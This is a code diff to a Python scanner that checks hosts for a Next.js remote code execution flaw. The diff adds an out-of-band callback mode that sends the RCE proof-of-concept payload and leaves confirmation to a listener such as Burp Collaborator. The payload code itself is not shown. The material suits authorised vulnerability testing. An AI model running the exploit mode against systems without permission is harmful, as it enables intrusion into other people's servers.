@@ -1,6 +1,6 @@
 #!/usr/bin/env -S uv run --script
 # /// script
-# requires-python = ">=3.9"
+# requires-python = ">=3.10"
 # dependencies = [
 #     "requests>=2.28.0",
 #     "tqdm>=4.64.0",
@@ -588,18 +588,18 @@ def check_vulnerability(
     result = ScanResult(host=host)
     result.detection_method = "safe_check" if safe_check else "rce_poc"
 
-    original_host = host
+    # Normalise and validate host
     host = normalize_host(host)
     if not host:
         result.error = "Invalid or empty host"
         return result
 
-    # Perform version fingerprinting if enabled
+    # Version fingerprinting (if enabled)
     if fingerprint:
         version_info = fingerprint_nextjs(host, timeout, verify_ssl, custom_headers)
         result.version_info = version_info
 
-        # If we can determine version and it's patched, skip exploit check
+        # Known patched version → skip exploit
         if version_info.nextjs_version and not version_info.potentially_vulnerable:
             result.vulnerable = False
             result.error = f"Version {version_info.nextjs_version} is patched"
@@ -607,6 +607,7 @@ def check_vulnerability(
 
     root_url = f"{host}/"
 
+    # Build payload + vuln checker
     if safe_check:
         body, content_type = build_safe_payload()
         is_vulnerable = is_vulnerable_safe_check
@@ -621,7 +622,11 @@ def check_vulnerability(
         is_vulnerable = is_vulnerable_rce_check
 
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
+        "User-Agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0"
+        ),
         "Next-Action": "x",
         "X-Nextjs-Request-Id": "b5dce965",
         "Content-Type": content_type,
@@ -659,6 +664,7 @@ def check_vulnerability(
             start_time = time.time()
             response, error = send_payload(url, headers, body, timeout, verify_ssl)
             elapsed_ms = (time.time() - start_time) * 1000
+            result.response_time_ms = elapsed_ms
 
             if response is not None:
                 return response, None, attempt
@@ -690,21 +696,23 @@ def check_vulnerability(
     result.status_code = response.status_code
     result.response = build_response_str(response)
 
-    if is_vulnerable(response):
-        result.vulnerable = True
-        return result
+    # In callback mode we *don’t* try to interpret the response as RCE;
+    # the ground truth lives in your OOB listener.
+    if not (callback_url and not safe_check):
+        if is_vulnerable(response):
+            result.vulnerable = True
+            return result
 
     # Root not vulnerable - try redirect path if enabled
     if follow_redirects:
         try:
             redirect_url = resolve_redirects(root_url, timeout, verify_ssl)
             if redirect_url != root_url:
-                # Different path, test it
                 response, error, attempts = attempt_exploit(redirect_url, retries)
                 result.retry_count = max(result.retry_count, attempts)
 
                 if error:
-                    # Keep root result but note the redirect failed
+                    # Keep root result but note redirect path failed
                     result.vulnerable = False
                     return result
 
@@ -713,12 +721,26 @@ def check_vulnerability(
                 result.status_code = response.status_code
                 result.response = build_response_str(response)
 
-                if is_vulnerable(response):
-                    result.vulnerable = True
-                    return result
+                if not (callback_url and not safe_check):
+                    if is_vulnerable(response):
+                        result.vulnerable = True
+                        return result
         except Exception:
-            pass  # Continue with root result if redirect resolution fails
+            # If redirect resolution fails, fall back to root result
+            pass
 
+    # Callback mode: we *only* report that payload was sent;
+    # user verifies via Burp Collaborator / interactsh / etc.
+    if callback_url and not safe_check:
+        result.vulnerable = None
+        result.detection_method = "callback"
+        result.error = (
+            "Callback mode: payload sent; verify RCE via your OOB listener "
+            "(e.g., Burp Collaborator, interactsh)."
+        )
+        return result
+
+    # No indicators found
     result.vulnerable = False
     return result
 
@@ -895,7 +917,6 @@ Affected Versions:
     parser.add_argument(
         "-k",
         "--insecure",
-        default=True,
         action="store_true",
         help="Disable SSL certificate verification",
     )
